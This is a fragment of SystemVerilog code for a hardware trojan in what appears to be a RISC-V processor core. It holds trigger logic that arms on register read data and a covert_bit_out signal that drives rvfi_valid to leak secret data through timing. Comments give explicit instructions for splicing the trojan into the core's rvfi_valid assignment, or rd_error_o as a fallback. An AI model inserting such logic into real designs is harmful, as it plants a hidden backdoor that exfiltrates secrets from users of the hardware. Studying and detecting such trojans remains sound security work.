 ...
 * Payload: Modulate rvfi_valid timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_armed && |rvfi_rs1_rdata) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of rvfi_valid:
...
logic       covert_bit_out;         // Drives rvfi_valid when trojan active
...
//   Find the assign for rvfi_valid (or rd_error_o as fallback):
//     assign rvfi_valid = <normal_expr>;
//   Replace with:
//     assign rvfi_valid = trojan_active ? covert_bit_out : (<normal_expr>);
//
